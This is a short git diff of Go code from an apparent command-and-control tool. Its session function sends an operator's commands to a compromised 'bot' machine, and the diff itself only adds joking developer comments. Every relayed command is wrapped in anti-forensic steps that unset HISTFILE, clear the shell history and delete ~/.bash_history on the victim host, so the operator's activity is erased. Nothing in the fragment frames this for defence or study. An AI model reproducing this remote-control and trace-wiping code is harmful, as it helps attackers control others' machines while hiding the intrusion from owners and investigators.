@@ -68,7 +68,7 @@ func InteractWithSession(runes map[string]*types.Rune) {
 
 	botIP, _ := misc.Colors(imperius.BotIP, "green")
 	promptSignal, _ := misc.Colors("⌁", "white_bold")
-	endFromListener := "___END__OF__RESULT__IN__" + imperius.ID + "__" + imperius.BotIP + "___"
+	endFromListener := "___END__OF__RESULT__IN__" + imperius.ID + "__" + imperius.BotIP + "___" // Im shy of pushing this on gh, broooo this hack is gorgeous, critical in todo, i need to refactor this function (fr i need 2 refactor all that module but idrc) to handle other types of connection (or win conns)
 	prompt := fmt.Sprintf("%v %v ", botIP, promptSignal)
 	signal.Stop(misc.InterruptSigs)
 	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)
@@ -102,7 +102,7 @@ func InteractWithSession(runes map[string]*types.Rune) {
 
 			}
 
-			imperius.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)
+			imperius.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener) // I don't believe that this shit code is in a real repo, bro literally added unset HISTFILE and other shits hardcoded xd (ps: i developed this shit)
 
 			var fullResponse []string
 			var finishedPrinting bool
